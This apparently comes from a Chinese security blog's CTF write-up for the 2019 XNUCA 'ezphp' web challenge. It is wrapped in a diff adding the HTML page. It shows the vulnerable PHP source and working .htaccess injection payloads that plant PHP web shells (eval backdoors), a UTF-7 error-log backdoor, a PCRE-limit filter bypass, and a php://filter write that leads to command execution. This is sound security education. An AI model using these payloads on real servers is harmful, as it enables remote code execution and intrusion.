@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"southsea.st","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="我太南了，我也想去深大打线下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019 XNUCA 线上预选赛 部分题解">
+<meta property="og:url" content="https://southsea.st/2019-XNUCA-Preliminary/index.html">
+<meta property="og:site_name" content="南溟丷">
+<meta property="og:description" content="我太南了，我也想去深大打线下。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-08-24T00:00:00.000Z">
+<meta property="article:modified_time" content="2021-02-02T04:11:18.106Z">
+<meta property="article:author" content="南溟丷">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://southsea.st/2019-XNUCA-Preliminary/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2019 XNUCA 线上预选赛 部分题解 | 南溟丷</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">南溟丷</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我想在那里最蓝的大海扬帆</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/2019-XNUCA-Preliminary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="南溟丷">
+      <meta itemprop="description" content="我想在那里最蓝的大海扬帆">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟丷">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2019 XNUCA 线上预选赛 部分题解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-08-24 00:00:00" itemprop="dateCreated datePublished" datetime="2019-08-24T00:00:00+00:00">2019-08-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%A2%98%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">题解</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2019-XNUCA-Preliminary/" class="post-meta-item leancloud_visitors" data-flag-title="2019 XNUCA 线上预选赛 部分题解" title="热度">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">热度：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <!--
+      <span class="post-meta-item-text">Valine：</span>
+      -->
+      <span class="post-meta-item-text">评论数：</span>
+    
+    <a title="valine" href="/2019-XNUCA-Preliminary/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019-XNUCA-Preliminary/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>我太南了，我也想去深大打线下。</p>
+<a id="more"></a>
+
+<h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">"fl3g.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nJust one chance"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一个<strong>file_put_contents()</strong>函数来写入文件，但过滤了内容和文件名，内容不许含有<strong>on、html、type、flag、upload、file</strong>等关键词，文件名只许由字母和点组成。</p>
+<p>尝试直接写入🐎，但是<strong>php</strong>不解析，猜测应该是在<strong>Apache</strong>的配置文件中做了限制，也无法覆盖<strong>index.php</strong>，猜测是由于其为<strong>root</strong>权限，思来想去，切入点应该是在<strong>.htaccess</strong>写🐎，可以使用<strong>\</strong>转义换行符连接上下文注释掉<strong>Just one chance</strong>，同时绕过过滤。</p>
+<p>于是达成了非预期解。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_fi\</span><br><span class="line">le .htaccess</span><br><span class="line">#&lt;?php eval($_POST[&quot;south&quot;]); ?&gt;\</span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload</strong>如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_append_fi%5C%0Ale%20.htaccess%0A%23%3C%3Fphp%20eval(%24_POST%5B%22south%22%5D)%3B%20%3F%3E%5C</span><br><span class="line">&#x2F;?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_append_fi%5C%0Ale%20.htaccess%0A%23%3C%3Fphp%20phpinfo()%3B%20%3F%3E%5C</span><br></pre></td></tr></table></figure>
+
+<h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><h5 id="利用文件包含"><a href="#利用文件包含" class="headerlink" title="利用文件包含"></a>利用文件包含</h5><p>代码中存在一个<strong>include_once(“fl3g.php”);</strong>，因此可以配置<strong>PHP</strong>配置文件中的<strong>include_path</strong>来设置<strong>include</strong>文件根目录路径。</p>
+<h5 id="报错写入后门"><a href="#报错写入后门" class="headerlink" title="报错写入后门"></a>报错写入后门</h5><p>在<strong>PHP</strong>配置文件中有一项配置<strong>error_log</strong>可以将指定的报错信息写入指定文件，而写入的内容则同样可以通过控制<strong>include_path</strong>的值来控制，此处可以将值设为后门代码。</p>
+<p>同时有一点比较常见的即是写入<strong>log</strong>的文件会被<strong>HTML</strong>编码，此时可以使用<strong>UTF-7</strong>编码绕过。</p>
+<p>以及有一个配置<strong>error_reporting</strong>用来指定报错级别，<strong>32767</strong>意味着记录全部报错信息。</p>
+<p>这一步先生成后门文件，设置了<strong>error_log</strong>路径和<strong>error_reporting</strong>级别，将后门代码进行<strong>UTF-7</strong>编码作为不存在的文件名写入<strong>log</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log &#x2F;tmp&#x2F;fl3g.php</span><br><span class="line">php_value error_reporting 32767</span><br><span class="line">php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload</strong>如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20error_log%20%2Ftmp%2Ffl3g.php%0Aphp_value%20error_reporting%2032767%0Aphp_value%20include_path%20%22%2BADw%3Fphp%20eval(%24_GET%5B1%5D)%2BADs%20%2BAF8AXw-halt%2BAF8-compiler()%2BADs%22%0A%23%20%5C</span><br></pre></td></tr></table></figure>
+
+<p>然后再次写入正确的<strong>include_path</strong>，即上一个<strong>Payload</strong>以后门代码作为文件名报错生成的后门路径，同时设置解码方式为<strong>UTF-7</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;&#x2F;tmp&quot;</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload</strong>如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20include_path%20%22%2Ftmp%22%0Aphp_value%20zend.multibyte%201%0Aphp_value%20zend.script_encoding%20%22UTF-7%22%0A%23%20%5C</span><br></pre></td></tr></table></figure>
+
+<h4 id="另一个非预期"><a href="#另一个非预期" class="headerlink" title="另一个非预期"></a>另一个非预期</h4><p><strong><a href="https://xz.aliyun.com/t/6101" target="_blank" rel="noopener">ROIS</a></strong>的解法。</p>
+<p>对于此处<strong>$content</strong>的过滤，最简单的方法便是编码绕过，同时<strong>$filename</strong>可控，即可以使用<strong>php://filter</strong>伪协议对其写入。</p>
+<p>而对此的<strong>preg_match()</strong>函数的检测，结合<strong>PHITHON</strong>师傅的一篇<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener"><strong>PHP</strong>利用<strong>PCRE</strong>回溯次数限制绕过某些安全限制</a>，对<strong>.htaccess</strong>配置<strong>pcre.backtrack_limit</strong>为<strong>0</strong>绕过，同时由于<strong>PHP7</strong>的环境，需要再配置<strong>pcre.jit</strong>为<strong>0</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br><span class="line">#aa\</span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload</strong>如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?content&#x3D;php_value%20pcre.backtrack_limit%200%0a%0dphp_value%20pcre.jit%200%0a%0d%0a%0d%23aa\&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure>
+
+<p>然后<strong>preg_match()</strong>失效，此时再使用伪协议来写入文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit    0</span><br><span class="line"></span><br><span class="line">php_value auto_append_file    &quot;.htaccess&quot;</span><br><span class="line"></span><br><span class="line">php_value pcre.jit   0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#aa&lt;?php eval($_GET[&#39;a&#39;]);?&gt;\</span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload</strong>如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?a&#x3D;system(&#39;cat ..&#x2F;..&#x2F;..&#x2F;flag&#39;);exit;&amp;content&#x3D;cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0ICAgIDAKDXBocF92YWx1ZSBhdXRvX2FwcGVuZF9maWxlICAgICIuaHRhY2Nlc3MiCg1waHBfdmFsdWUgcGNyZS5qaXQgICAwCg0KDSNhYTw&#x2F;cGhwIGV2YWwoJF9HRVRbJ2EnXSk7Pz5c&lt;&lt;&amp;filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;.htaccess</span><br></pre></td></tr></table></figure>
+
+<h3 id="HardJS"><a href="#HardJS" class="headerlink" title="HardJS"></a>HardJS</h3>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Study-RSA/" rel="prev" title="关于RSA的学习">
+      <i class="fa fa-chevron-left"></i> 关于RSA的学习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019-SUCTF/" rel="next" title="2019 SUCTF 部分题解">
+      2019 SUCTF 部分题解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ezphp"><span class="nav-number">1.</span> <span class="nav-text">ezphp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#预期解"><span class="nav-number">1.1.</span> <span class="nav-text">预期解</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用文件包含"><span class="nav-number">1.1.1.</span> <span class="nav-text">利用文件包含</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#报错写入后门"><span class="nav-number">1.1.2.</span> <span class="nav-text">报错写入后门</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#另一个非预期"><span class="nav-number">1.2.</span> <span class="nav-text">另一个非预期</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HardJS"><span class="nav-number">2.</span> <span class="nav-text">HardJS</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟丷"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">南溟丷</p>
+  <div class="site-description" itemprop="description">我想在那里最蓝的大海扬帆</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">66</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:i@southsea.st" title="E-Mail → mailto:i@southsea.st"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.codemonster.cn/" title="https:&#x2F;&#x2F;www.codemonster.cn&#x2F;" rel="noopener" target="_blank">Xishir</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.lmxspace.com/" title="http:&#x2F;&#x2F;www.lmxspace.com&#x2F;" rel="noopener" target="_blank">L1nk3r</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://she1don.cn/" title="http:&#x2F;&#x2F;she1don.cn&#x2F;" rel="noopener" target="_blank">Sheldon</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yuf1sher.xyz/" title="http:&#x2F;&#x2F;www.yuf1sher.xyz&#x2F;" rel="noopener" target="_blank">saltyfishyu</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.backcover7.cc/" title="https:&#x2F;&#x2F;blog.backcover7.cc&#x2F;" rel="noopener" target="_blank">backcover7</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cyto.top/" title="https:&#x2F;&#x2F;cyto.top&#x2F;" rel="noopener" target="_blank">Cytosine</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.csdn.net/PeterZ1997/" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;PeterZ1997&#x2F;" rel="noopener" target="_blank">PeterZ</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://ju5tw4nty0u.top/" title="http:&#x2F;&#x2F;ju5tw4nty0u.top&#x2F;" rel="noopener" target="_blank">ju5tw4nty0u</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.thecosmos.cn/" title="http:&#x2F;&#x2F;blog.thecosmos.cn&#x2F;" rel="noopener" target="_blank">Cosmos</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://nepire.github.io/" title="https:&#x2F;&#x2F;nepire.github.io&#x2F;" rel="noopener" target="_blank">Nepire</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.anonym1ty.cn/" title="http:&#x2F;&#x2F;www.anonym1ty.cn&#x2F;" rel="noopener" target="_blank">豆浆油条</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://a3ura.github.io/" title="https:&#x2F;&#x2F;a3ura.github.io&#x2F;" rel="noopener" target="_blank">A3ura</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://lihuaiqiu.github.io/" title="https:&#x2F;&#x2F;lihuaiqiu.github.io&#x2F;" rel="noopener" target="_blank">离怀秋</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.zhaoj.in/" title="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;" rel="noopener" target="_blank">glzjin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.sketchplane.top/" title="http:&#x2F;&#x2F;www.sketchplane.top&#x2F;" rel="noopener" target="_blank">sketch_pl4ne</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yk2.work/" title="http:&#x2F;&#x2F;www.yk2.work&#x2F;" rel="noopener" target="_blank">yk2</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.star123.top/" title="http:&#x2F;&#x2F;www.star123.top&#x2F;" rel="noopener" target="_blank">star</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟丷</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+      -->
+      有
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-divider">只猫来偷了</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+      -->
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+      条鱼
+    </span>
+</div>
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .catch(error => {
